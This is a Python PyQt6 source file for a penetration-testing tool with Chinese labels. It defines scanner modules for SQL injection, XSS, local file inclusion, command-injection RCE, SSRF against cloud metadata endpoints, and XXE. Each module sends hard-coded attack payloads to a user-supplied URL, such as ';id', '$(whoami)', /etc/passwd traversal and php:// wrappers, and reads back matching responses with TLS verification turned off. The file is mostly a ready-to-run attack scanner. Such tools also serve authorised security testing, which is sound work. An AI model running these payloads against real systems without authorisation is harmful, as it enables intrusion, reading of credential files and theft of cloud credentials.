from . import register_module
from gui.widgets.base_module import BaseModuleWidget, LogLevel
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QComboBox, QCheckBox, QSpinBox, QGroupBox,
    QFormLayout, QTextEdit, QTableWidget, QTableWidgetItem,
    QHeaderView, QProgressBar, QFileDialog, QMessageBox
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
import subprocess
import threading
import re
import os


@register_module("sqli")
class SQLiScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("SQL注入")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("扫描选项")
        form_layout = QFormLayout(options_group)
        
        self._level_spin = QSpinBox()
        self._level_spin.setRange(1, 5)
        self._level_spin.setValue(1)
        form_layout.addRow("测试等级:", self._level_spin)
        
        self._risk_spin = QSpinBox()
        self._risk_spin.setRange(1, 3)
        self._risk_spin.setValue(1)
        form_layout.addRow("风险等级:", self._risk_spin)
        
        self._technique_combo = QComboBox()
        self._setup_combo(self._technique_combo, [
            "全部技术", "布尔盲注", "时间盲注", "报错注入", "联合查询", "堆叠查询"
        ])
        form_layout.addRow("注入技术:", self._technique_combo)
        
        self._dbms_combo = QComboBox()
        self._setup_combo(self._dbms_combo, [
            "自动检测", "MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"
        ])
        form_layout.addRow("数据库类型:", self._dbms_combo)
        
        self._tamper_combo = QComboBox()
        self._setup_combo(self._tamper_combo, [
            "无", "space2comment", "between", "charencode", "base64encode"
        ])
        form_layout.addRow("混淆脚本:", self._tamper_combo)
        
        self._batch_check = QCheckBox("批处理模式")
        form_layout.addRow(self._batch_check)
        
        self._random_agent_check = QCheckBox("随机User-Agent")
        self._random_agent_check.setChecked(True)
        form_layout.addRow(self._random_agent_check)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["参数", "注入类型", "数据库", "Payload"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        if self._is_tool_available("sqlmap"):
            self._scan_with_sqlmap(target)
        else:
            self._scan_builtin(target)
    
    def _scan_with_sqlmap(self, target: str):
        self._add_log(LogLevel.INFO, f"使用 SQLMap 扫描: {target}")
        
        args = [
            "-u", target,
            f"--level={self._level_spin.value()}",
            f"--risk={self._risk_spin.value()}",
            "--batch",
            "--random-agent" if self._random_agent_check.isChecked() else None
        ]
        
        args = [arg for arg in args if arg]
        
        try:
            process = self._execute_tool("sqlmap", args)
            
            while True:
                if not self._is_scanning:
                    process.terminate()
                    break
                
                line = process.stdout.readline()
                if not line:
                    if process.poll() is not None:
                        break
                    continue
                
                line = line.strip()
                self._add_log(LogLevel.DEBUG, line)
                
                if "injectable" in line.lower() or "vulnerable" in line.lower():
                    self._add_log(LogLevel.SUCCESS, f"发现注入点: {line}")
            
            self._add_log(LogLevel.SUCCESS, "SQLMap 扫描完成")
            
        except Exception as e:
            self._add_log(LogLevel.ERROR, f"SQLMap 扫描失败: {str(e)}")
    
    def _scan_builtin(self, target: str):
        import requests
        
        self._add_log(LogLevel.INFO, f"使用内置扫描器: {target}")
        
        payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "1' AND '1'='1",
            "1\" AND \"1\"=\"1",
            "' UNION SELECT NULL--",
            "1' ORDER BY 1--",
        ]
        
        for payload in payloads:
            if not self._is_scanning:
                break
            
            try:
                test_url = target + payload if '?' in target else target + "?id=" + payload
                resp = requests.get(test_url, timeout=10, verify=False)
                
                errors = ['sql', 'mysql', 'syntax', 'oracle', 'postgresql', 'sqlite']
                for error in errors:
                    if error in resp.text.lower():
                        self._add_result("GET参数", "SQL注入", "可能", payload)
                        self._add_log(LogLevel.SUCCESS, f"发现可能的注入点: {payload}")
                        break
            except:
                pass
        
        self._add_log(LogLevel.INFO, "内置扫描完成")


@register_module("xss")
class XSSScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("XSS跨站脚本")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("扫描选项")
        form_layout = QFormLayout(options_group)
        
        self._scan_type_combo = QComboBox()
        self._setup_combo(self._scan_type_combo, [
            "反射型XSS", "存储型XSS", "DOM型XSS", "全部类型"
        ])
        form_layout.addRow("扫描类型:", self._scan_type_combo)
        
        self._blind_xss_check = QCheckBox("盲测XSS")
        form_layout.addRow(self._blind_xss_check)
        
        self._custom_payload_check = QCheckBox("自定义Payload")
        form_layout.addRow(self._custom_payload_check)
        
        self._payload_input = QLineEdit()
        self._payload_input.setPlaceholderText("输入自定义Payload，多个用逗号分隔")
        self._payload_input.setEnabled(False)
        self._custom_payload_check.stateChanged.connect(
            lambda: self._payload_input.setEnabled(self._custom_payload_check.isChecked())
        )
        form_layout.addRow("Payload:", self._payload_input)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["参数", "注入类型", "Payload", "证据"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        if self._is_tool_available("dalfox"):
            self._scan_with_dalfox(target)
        else:
            self._scan_builtin(target)
    
    def _scan_with_dalfox(self, target: str):
        self._add_log(LogLevel.INFO, f"使用 Dalfox 扫描: {target}")
        
        args = ["url", target, "--silence", "--format", "json"]
        
        try:
            process = self._execute_tool("dalfox", args)
            
            while True:
                if not self._is_scanning:
                    process.terminate()
                    break
                
                line = process.stdout.readline()
                if not line:
                    if process.poll() is not None:
                        break
                    continue
                
                line = line.strip()
                if line:
                    self._add_log(LogLevel.SUCCESS, f"发现XSS: {line}")
            
            self._add_log(LogLevel.SUCCESS, "Dalfox 扫描完成")
            
        except Exception as e:
            self._add_log(LogLevel.ERROR, f"Dalfox 扫描失败: {str(e)}")
    
    def _scan_builtin(self, target: str):
        import requests
        
        self._add_log(LogLevel.INFO, f"使用内置扫描器: {target}")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
        ]
        
        for payload in payloads:
            if not self._is_scanning:
                break
            
            try:
                test_url = target + payload if '?' in target else target + "?q=" + payload
                resp = requests.get(test_url, timeout=10, verify=False)
                
                if payload in resp.text:
                    self._add_result("GET参数", "反射型XSS", payload, "Payload在响应中")
                    self._add_log(LogLevel.SUCCESS, f"发现XSS: {payload}")
            except:
                pass
        
        self._add_log(LogLevel.INFO, "内置扫描完成")


@register_module("lfi")
class LFIScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("本地文件包含")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("扫描选项")
        form_layout = QFormLayout(options_group)
        
        self._os_combo = QComboBox()
        self._setup_combo(self._os_combo, ["自动检测", "Linux", "Windows"])
        form_layout.addRow("目标系统:", self._os_combo)
        
        self._depth_spin = QSpinBox()
        self._depth_spin.setRange(1, 10)
        self._depth_spin.setValue(5)
        form_layout.addRow("目录深度:", self._depth_spin)
        
        self._wrapper_check = QCheckBox("使用包装器")
        self._wrapper_check.setChecked(True)
        form_layout.addRow(self._wrapper_check)
        
        self._rfi_check = QCheckBox("包含RFI测试")
        form_layout.addRow(self._rfi_check)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["参数", "文件路径", "类型", "内容预览"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        import requests
        
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self._add_log(LogLevel.INFO, f"开始LFI扫描: {target}")
        
        payloads = [
            "/etc/passwd",
            "/etc/passwd%00",
            "....//....//....//etc/passwd",
            "/etc/passwd%00.jpg",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "/proc/self/environ",
            "C:/Windows/System32/drivers/etc/hosts",
        ]
        
        for payload in payloads:
            if not self._is_scanning:
                break
            
            try:
                test_url = target + payload if '?' in target else target + "?file=" + payload
                resp = requests.get(test_url, timeout=10, verify=False)
                
                indicators = ['root:', '[extensions]', 'passwd', 'hosts']
                for indicator in indicators:
                    if indicator in resp.text.lower():
                        self._add_result("file参数", payload, "LFI", resp.text[:100])
                        self._add_log(LogLevel.SUCCESS, f"发现LFI: {payload}")
                        break
            except:
                pass
        
        self._add_log(LogLevel.INFO, "LFI扫描完成")


@register_module("rce")
class RCEScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("远程代码执行")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("扫描选项")
        form_layout = QFormLayout(options_group)
        
        self._os_combo = QComboBox()
        self._setup_combo(self._os_combo, ["自动检测", "Linux", "Windows"])
        form_layout.addRow("目标系统:", self._os_combo)
        
        self._technique_combo = QComboBox()
        self._setup_combo(self._technique_combo, [
            "命令注入", "代码注入", "模板注入", "反序列化"
        ])
        form_layout.addRow("注入技术:", self._technique_combo)
        
        self._blind_check = QCheckBox("盲注检测")
        self._blind_check.setChecked(True)
        form_layout.addRow(self._blind_check)
        
        self._callback_input = QLineEdit()
        self._callback_input.setPlaceholderText("回调服务器地址 (如: burpcollaborator.net)")
        form_layout.addRow("回调地址:", self._callback_input)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["参数", "注入类型", "Payload", "证据"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        import requests
        
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self._add_log(LogLevel.INFO, f"开始RCE扫描: {target}")
        
        payloads = [
            ";id",
            "|id",
            "$(id)",
            "`id`",
            "&&id",
            "||id",
            ";whoami",
            "|whoami",
            "$(whoami)",
            "`whoami`",
        ]
        
        for payload in payloads:
            if not self._is_scanning:
                break
            
            try:
                test_url = target + payload if '?' in target else target + "?cmd=" + payload
                resp = requests.get(test_url, timeout=10, verify=False)
                
                indicators = ['uid=', 'gid=', 'root', 'admin', 'www-data', 'apache']
                for indicator in indicators:
                    if indicator in resp.text.lower():
                        self._add_result("cmd参数", "命令注入", payload, resp.text[:100])
                        self._add_log(LogLevel.SUCCESS, f"发现RCE: {payload}")
                        break
            except:
                pass
        
        self._add_log(LogLevel.INFO, "RCE扫描完成")


@register_module("ssrf")
class SSRFScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("服务端请求伪造")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("扫描选项")
        form_layout = QFormLayout(options_group)
        
        self._callback_input = QLineEdit()
        self._callback_input.setPlaceholderText("回调服务器地址")
        form_layout.addRow("回调地址:", self._callback_input)
        
        self._cloud_check = QCheckBox("云元数据检测")
        self._cloud_check.setChecked(True)
        form_layout.addRow(self._cloud_check)
        
        self._internal_check = QCheckBox("内网探测")
        form_layout.addRow(self._internal_check)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["参数", "请求地址", "类型", "响应"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        import requests
        
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self._add_log(LogLevel.INFO, f"开始SSRF扫描: {target}")
        
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://169.254.169.254/metadata/v1/",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
        ]
        
        for payload in payloads:
            if not self._is_scanning:
                break
            
            try:
                test_url = target + payload if '?' in target else target + "?url=" + payload
                resp = requests.get(test_url, timeout=10, verify=False)
                
                indicators = ['ami-id', 'instance-id', 'passwd', 'redis_version']
                for indicator in indicators:
                    if indicator in resp.text.lower():
                        self._add_result("url参数", payload, "SSRF", resp.text[:100])
                        self._add_log(LogLevel.SUCCESS, f"发现SSRF: {payload}")
                        break
            except:
                pass
        
        self._add_log(LogLevel.INFO, "SSRF扫描完成")


@register_module("xxe")
class XXEScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("XML外部实体注入")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("扫描选项")
        form_layout = QFormLayout(options_group)
        
        self._callback_input = QLineEdit()
        self._callback_input.setPlaceholderText("回调服务器地址")
        form_layout.addRow("回调地址:", self._callback_input)
        
        self._oob_check = QCheckBox("带外检测")
        self._oob_check.setChecked(True)
        form_layout.addRow(self._oob_check)
        
        self._file_check = QCheckBox("文件读取")
        self._file_check.setChecked(True)
        form_layout.addRow(self._file_check)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["端点", "请求类型", "Payload类型", "证据"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        import requests
        
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self._add_log(LogLevel.INFO, f"开始XXE扫描: {target}")
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
        ]
        
        for payload in xxe_payloads:
            if not self._is_scanning:
                break
            
            try:
                resp = requests.post(target, data=payload, 
                                    headers={'Content-Type': 'application/xml'},
                                    timeout=10, verify=False)
                
                indicators = ['root:', 'passwd', 'localhost', 'hosts']
                for indicator in indicators:
                    if indicator in resp.text.lower():
                        self._add_result(target, "POST", "XXE", resp.text[:100])
                        self._add_log(LogLevel.SUCCESS, f"发现XXE漏洞")
                        break
            except:
                pass
        
        self._add_log(LogLevel.INFO, "XXE扫描完成")
